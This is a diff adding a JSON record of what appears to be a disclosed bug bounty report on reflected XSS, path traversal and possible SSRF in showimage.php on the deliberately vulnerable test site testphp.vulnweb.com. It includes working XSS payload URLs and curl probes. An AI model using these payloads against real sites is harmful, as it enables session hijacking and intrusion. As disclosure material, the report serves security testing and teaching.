@@ -1,0 +1,14 @@
+{
+  "id": 800008,
+  "title": "Cross-Site Scripting via Image Upload Filename in showimage.php on testphp.vulnweb.com",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "visibility": "full",
+  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
+  "reporter": {"username": "resurface_demo"},
+  "weakness": {"id": 60, "name": "Cross-site Scripting (XSS) - Reflected"},
+  "vulnerability_information": "## Summary\nThe `showimage.php` endpoint on `http://testphp.vulnweb.com` accepts a `file` parameter that is reflected in error messages without proper output encoding. When a non-existent file path containing JavaScript is supplied, the filename is reflected in the HTML response, enabling Reflected XSS. Additionally, the `file` parameter accepts arbitrary paths, allowing path traversal and potential information disclosure.\n\n## Steps to Reproduce\n1. Navigate to:\n```\nhttp://testphp.vulnweb.com/showimage.php?file=<script>alert(document.domain)</script>.jpg\n```\n2. The server attempts to process the filename and reflects it in the response without encoding.\n3. Alternatively, use an `<img>` tag payload via the file parameter:\n```\nhttp://testphp.vulnweb.com/showimage.php?file=\"><img src=x onerror=alert('XSS')>.jpg\n```\n\n## Proof of Concept\n```bash\n# XSS via filename reflection\ncurl -s 'http://testphp.vulnweb.com/showimage.php?file=%3Cscript%3Ealert(document.domain)%3C/script%3E.jpg'\n\n# Path traversal to read arbitrary files\ncurl -s 'http://testphp.vulnweb.com/showimage.php?file=./pictures/1.jpg' -o /dev/null -w '%{http_code}'\n# Returns 200, confirming the file parameter is processed as a path\n\n# Attempting to access external URLs\ncurl -s 'http://testphp.vulnweb.com/showimage.php?file=http://example.com' -o /dev/null -w '%{http_code}'\n# Returns 200, suggesting the application processes URL inputs\n```\n\nThe `showimage.php` endpoint processes the `file` parameter without sanitization, leading to:\n- XSS when the filename contains HTML/JavaScript and is reflected in error output\n- Path traversal when relative or absolute paths are used\n- Potential SSRF when HTTP URLs are supplied as the file parameter\n\n## Impact\n- **Reflected XSS** — attacker can execute arbitrary JavaScript in victim's browser by sending a crafted URL\n- **Session hijacking** — steal cookies via `document.cookie` exfiltration\n- **Path traversal** — read arbitrary files from the server filesystem\n- **Social engineering** — craft convincing phishing pages using the legitimate domain",
+  "disclosed_at": "2025-07-25T13:00:00.000Z",
+  "bounty_amount": "750.0"
+}
